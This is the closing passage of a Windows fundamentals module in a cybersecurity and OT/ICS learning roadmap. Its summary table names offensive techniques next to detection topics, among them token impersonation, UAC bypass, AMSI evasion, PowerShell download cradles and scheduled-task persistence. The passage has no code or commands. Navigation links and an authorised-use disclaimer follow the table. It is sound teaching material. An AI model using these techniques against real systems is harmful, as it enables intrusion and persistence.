| User/Group Management | Privilege escalation via group membership, token impersonation |
| Services | Unquoted paths, weak binary permissions — service-based privesc |
| Task Manager / Event Viewer | Anomaly detection, forensic investigation, key Event IDs |
| Windows Defender / AMSI | Understanding evasion to build better detections |
| UAC | Integrity levels, bypass techniques, not a security boundary |
| Windows Firewall | Host-based filtering, attacker modifications, WFP architecture |
| PowerShell | LOLBin #1 — download cradles, encoding, script block logging |
| CMD | Basic LOLBins, service manipulation, scheduled task abuse |
| Task Scheduler | Most common persistence mechanism — creation, detection |
| Windows Update | WSUS poisoning risk, patch management, identifying missing patches |

---

> **Next Module:** [Stage 0.4 — Linux Fundamentals](./stage-0.4-linux-fundamentals.md)  
> **Previous Module:** [Stage 0.2 — Operating System Fundamentals](./stage-0.2-operating-system-fundamentals.md)  
> **Series Index:** [Full Roadmap Index](./README.md)

---

*This document is part of the Cybersecurity × OT/ICS Security Full Roadmap series. All techniques described are presented strictly for educational purposes, authorised security research, and defensive security practice. Always obtain proper authorisation before testing any system.*